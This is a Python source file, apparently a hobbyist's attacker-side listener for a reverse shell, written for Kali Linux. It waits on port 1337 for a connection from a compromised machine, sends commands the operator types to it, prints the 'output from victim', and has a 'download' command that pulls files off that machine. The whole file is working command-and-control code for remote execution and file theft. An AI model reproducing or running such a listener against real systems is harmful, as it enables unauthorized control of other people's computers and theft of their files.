import socket, sys, json, argparse, subprocess, traceback, base64, logging, time
from sys import getsizeof
from itertools import cycle
import multiprocessing, time


class fc: #ascii font color class
    rw = '\033[31;107m'
    r = '\033[38;5;196m'
    pv = '\033[38;5;206;48;5;57m'
    end = '\033[0m'
    pink = '\033[38;5;206m'
    y = '\033[0;33;40m'
    purple = '\033[0;35m'
    wg = '\033[37;42m'
    cyan = '\033[36m'
    g = '\033[38;5;154m'
    b = '\033[38;5;45m'


class Args: #take args (set to defaults on kali)


    def __init__(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('-i','--IP',dest = 'ip', help = 'Enter target IP address.')
        parser.add_argument('-p','--port',dest = 'port', help = 'Enter target port.')
        parser.set_defaults(ip = self.get_ip())
        parser.set_defaults(port = 1337)
        options = parser.parse_args()
        self.ip = options.ip
        self.port = options.port
        

    def get_ip(self): #kali resuable IP code
        pipecmd_ip = "/sbin/ip route | awk '/src/ { printf $9 }'"
        ip = subprocess.check_output(pipecmd_ip,shell=True)
        ip_decoded = ip.decode('utf-8')
        self.ip = ip_decoded
        return self.ip


class Listener:
    
    def __init__(self,ip,port): #set up socket listener, spinner, interrupt
        spinner = multiprocessing.Process(target=self.spinner) #worked better for spinner, easily terminate a thread 
        #self.byteTotal = 0
        self.listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
        self.listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1) #reuse address allows socket to bind
        self.listener.bind((str(ip),port)) #bind to this machine! 127.0.0.1 might work to? 
        self.listener.listen(0)
        print(f'Starting listener on address {fc.b}{ip}{fc.end} and port {fc.b}{port}{fc.end}.\n{fc.y}Waiting for connection...{fc.end}'.format(ip,port)) #add a threading spinner here
        spinner.start()
        try:
            self.connection,address = self.listener.accept() #address is tuple with address and port
        except KeyboardInterrupt:
            spinner.terminate()
            print('\nSIGINT caught, exiting...')
            sys.exit()
        ##print(connection) #connection is the socket object with information about local address and remote address
        spinner.terminate()
        print(f'{fc.g}Connection established with {fc.pink}{str(address[0])}{fc.end} on port {fc.pink}{str(address[1])}{fc.end}')
        print(f'Enter {fc.rw}\'bye\'{fc.end} to close connection')
    

    def sendStream(self,data): #base sender with json serialization
        jsData = json.dumps(data)
        self.connection.send(str(jsData).encode('utf-8'))
    
    
    def recvStream(self):
        jsData = ''
        ##print(getsizeof(jsData))
        
        while True:
            
            try:
                #print('Receiving data')
                recvData = self.connection.recv(1024)
                if isinstance(recvData,bytes):
                    recvData = recvData.decode()
                ##print(getsizeof(jsData))
                #byteSize = getsizeof(jsData)
                #self.byteTotal += byteSize
                jsData = jsData + recvData
                return json.loads(jsData)
        
            except Exception as e:
                #print(f'{fc.rw}{e}{fc.end}')
                continue
    
    
    def spinner(self): #spinner
        spinnerChars = ['-', '/', '|', '\\']
        while True:
            for char in cycle(spinnerChars):
                print(f'{fc.pv}{char}{fc.end}',end='\r')
                time.sleep(.2)
        
    
    def utf8len(self,string):
        return len(string.encode('utf-8'))
    
    def write_file(self,file,content): #should be default get a dictionary
              
        if isinstance(content,dict):
            
            if 'data' in content.keys():
                content = content['data']
                #print(content)
                
                with open(file,'wb') as write_file:
                    write_file.write(base64.b64decode(content))
                return (f'Successfully downloaded {file}')
            
            else:
                content = content['fault']
                #print(content)
                content = base64.b64decode(content)
                #print(type(content))
                content = content.decode()
                return content


    def executeCmd(self,cmd):
        #cmd = str(cmd).encode('utf-8')
        ##print('executeCmd')
        ##print(cmd)
        time.sleep(1)
        self.sendStream(cmd)
        #self.sendStream('\r\n')
        #result = self.connection.recv(1024)
        #result = result.decode()
        time.sleep(1)
        return self.recvStream() #calling.executeCmd will return the result of the command sent by run()


    def run(self): #so my run() function will need to do the exit call logic, execCmd just needs to send and receive the command from run
        while True:

            cmd = input(f'{fc.r}Enter command to execute on target:{fc.end}')
            ##print(cmd)
            cmd = cmd.split(' ')
            ##print(cmd[0])
            
            if cmd[0] == '':
                #print(cmd)
                cmd[0] = "\r\n" 
                result = self.executeCmd(cmd)   
                print(f'Output from victim, {fc.g}{self.utf8len(result)}{fc.end} bytes long')
                print(f'{fc.purple}#{fc.end}'*100)
                print(f'{fc.b}{result}{fc.end}')
                print(f'{fc.purple}#{fc.end}'*100)
          
            elif cmd[0] != 'bye':
                            
                if cmd[0] == 'download':
                    
                    try:
                        print(f'{fc.purple}#{fc.end}'*100)
                        print(f'{fc.b}{self.write_file(cmd[1],self.executeCmd(cmd))}{fc.end}')
                        print(f'{fc.purple}#{fc.end}'*100)
                    
                    except IndexError:
                        print('No argument for download, command not executed')
 
                else:
                    result = self.executeCmd(cmd)   
                    print(f'Output from victim, {fc.g}{self.utf8len(result)}{fc.end} bytes long')
                    print(f'{fc.purple}#{fc.end}'*100)
                    print(f'{fc.b}{result}{fc.end}')
                    print(f'{fc.purple}#{fc.end}'*100)
            
            else:
                print(f'{fc.rw}Exit call received, closing connection{fc.end}')
                self.sendStream(cmd)
                self.listener.close()
                exit() 
          

##########################################################################RUN##########################################################################


try:
    args = Args()
    listener = Listener(args.ip,args.port)
    listener.run()


except Exception:
    print(f'Fatal Error, quitting...\nError: {fc.rw}{traceback.format_exc()}{fc.end}')

    
except KeyboardInterrupt:
    print(f'{fc.rw}Interrupt caught, exiting...{fc.end}')
    sys.exit()
